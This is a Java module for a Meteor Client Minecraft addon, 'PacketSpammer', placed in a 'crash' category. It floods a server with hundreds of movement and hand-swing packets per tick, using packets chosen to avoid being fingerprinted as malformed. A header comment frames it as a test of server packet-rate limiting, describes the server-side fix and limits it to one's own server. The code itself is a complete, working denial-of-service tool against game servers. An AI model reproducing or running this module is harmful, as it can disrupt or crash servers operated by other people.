package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

/**
 * AUDIT: Packet Spammer (raw inbound packet rate limiter test)
 *
 * Alternates PlayerMoveC2SPacket.OnGroundOnly and HandSwingC2SPacket at a
 * configurable rate (default 100 pairs/tick = 200 packets/tick). Tests the
 * server's raw inbound packet-rate limiter — the first line of defence that
 * should apply before any packet is parsed or dispatched.
 *
 * The specific packet types are chosen because they are among the cheapest
 * to construct and the most commonly sent, and because the ground-flag
 * packet is valid even with a random onGround value, making it hard to
 * fingerprint as clearly malformed.
 *
 * Patch signal: Netty read throttling or a per-connection packet budget
 * applied at the channel-inbound stage, before any packet reaches the main
 * thread; the budget must be reset per real-time window (wall-clock), not
 * per-tick, to survive timer-hack clients that compress many "ticks" into
 * one second.
 *
 * Run against your OWN local server only.
 */
public class PacketSpammer extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(100).min(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public PacketSpammer() {
        super(AddonTemplate.CRASH_CATEGORY, "packet-spammer",
            "Spams onGround + swing packets to test raw inbound packet rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        for (int i = 0; i < amount.get(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5, false));
            packetsSent++;
            mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
